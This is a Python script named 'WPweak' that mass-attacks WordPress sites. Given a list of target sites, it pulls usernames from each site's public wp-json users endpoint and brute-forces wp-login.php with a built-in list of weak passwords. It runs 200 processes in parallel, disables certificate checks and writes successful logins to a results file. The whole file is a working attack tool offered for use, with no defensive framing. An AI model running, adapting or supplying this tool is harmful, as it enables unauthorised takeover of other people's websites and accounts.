import requests, os, colorama, platform, multiprocessing
from colorama import Fore
from platform import system
from multiprocessing import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if system() == 'Linux':
    os.system('clear')
else:
    os.system('cls')

print(f"""{Fore.YELLOW}
 __        ______                     _    
 \ \      / /  _ \__      _____  __ _| | __ 
  \ \ /\ / /| |_) \ \ /\ / / _ \/ _` | |/ / 
   \ V  V / |  __/ \ V  V /  __/ (_| |   < {Fore.WHITE} (c) Rafaeyfa1337{Fore.YELLOW}
    \_/\_/  |_|     \_/\_/ \___|\__,_|_|\_\ {Fore.WHITE} WordPress Weak Password (auto get username from wp-json)\n""")

listmega = input("Website list (eg: list.txt): ")
# username list tambahan (opsional): https://pastebin.com/raw/HSK1vGKH
# password list tambahan (opsional): https://pastebin.com/raw/jiVFDYzq
usernamelist = ["admin", "user", "administrator", "superadmin", "super", "petugas", "operator", "adminwp", "wordpress", "wpadmin", "wp", "webmaster", "admin1", "admin2", "admin3", "admin4", "admin5", "admin6", "admin7", "admin8", "admin9", "admin10", "adm", "root", "manager"]
passwordlist = ["password", "pass", "pass123", "admin123", "admin12345", "12345", "rahasia", "bismillah", "12345", "123456", "1234567", "12345678", "123456789", "admin@123", "admin@12345", "admin", "adminadmin", "superadmin", "password", "a", "123", "123123", "1234", "12345", "123456", "1234567", "12345678", "123456789", "1234567890", "admin123", "admin1234", "admin@1234", "admin12345", "Admin", "ADMIN", "rahasia", "rahasia12345", "rahasia123", "Administrator", "administrator", "administrator123", "administrator1234", "administrator12345", "administrator@123", "administrator@12345", "Admin123", "Admin@123", "admin123456", "admin1234567", "admin12345678", "admin2017", "admin2018", "admin2019", "admin2020", "admin2021", "admin2022", "admin2023", "admin2o2o", "adminppid", "adminbkd", "jdih", "adminjdih", "adminauth", "admin2016", "admin1337", "1122334455", "112233", "11223344", "1122", "123a5678", "1", "2", "3", "12", "demo", "qwerty", "qwerty123", "qwertyuiop", "asdfg", "asd123", "asd", "zxcvbnm", "qawsed", "aqswde", "zxcv", "admin1", "admin2", "admin@123", "admin@12345", "admin@1234", "admin@123456", "admin@1234567", "admin@12345678", "admin@admin", "123admin", "adminweb", "adminpass", "adminpassword", "pass@123", "pass", "2k20", "2k21", "2k22", "2k23", "2k19", "2k18", "2016", "2017", "2018", "2019", "2020", "2021", "2022", "2023", "@admin", "PassWord", "admin@2018", "admin@2016", "admin@2017", "admin@2019", "admin@2020", "admin@2021", "admin@2022", "admin@2023", "p455w0rd", "asd@123", "123qwe", "root", "toor", "1q2w3e", "asd12345", "petugas", "petugas123", "operator123", "operator", "pegawai", "mahasiswa", "dosen", "test", "54321", "4321", "654321", "user@123", "user123", "user12345", "test@123", "test12345", "test123", "test1234", "adminasd", "abc", "ABCDE", "qwe123", "qwe", "abcd", "abc123", "abc@123"]

def grabuser(url):
    try:
        userjos = requests.get(f'http://{url}/wp-json/wp/v2/users', timeout=10, verify=False)
        if userjos.status_code == 200:
            return [user['slug'] for user in userjos.json()]
    except:
        pass
    return []

def wpweakpass(url):
    userfrjson = grabuser(url)
    try:
        for username in userfrjson + usernamelist:
            for password in passwordlist:
                r = requests.post(f'http://{url}/wp-login.php', data={'log': username, 'pwd': password}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}, timeout=10, allow_redirects=True, verify=False)
                if 'action=lostpassword' not in r.text and 'wp-admin/post.php' in r.text:
                    print(f'{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {url}{Fore.YELLOW} | {Fore.GREEN}{username}{Fore.YELLOW}:{Fore.GREEN}{password}')
                    with open('result_wp.txt', 'a') as output:
                        output.write(f'http://{url}/wp-login.php | Username: {username} | Password: {password}\n')
                    return True
                else:
                    print(f'{Fore.WHITE}[{Fore.YELLOW}-{Fore.WHITE}] {url}{Fore.YELLOW} | {Fore.RED}{username}{Fore.YELLOW}:{Fore.RED}{password}')
    except:
        pass

def main():
    with open(listmega, 'r') as f:
        urls = [line.strip('\n') for line in f.readlines()]
        with Pool(200) as pool:
            pool.map(wpweakpass, urls)
    print(f"\n{Fore.WHITE}DONE BRO! Result yang berhasil login disimpan pada file result_wp.txt!")

if __name__ == '__main__':
    main()
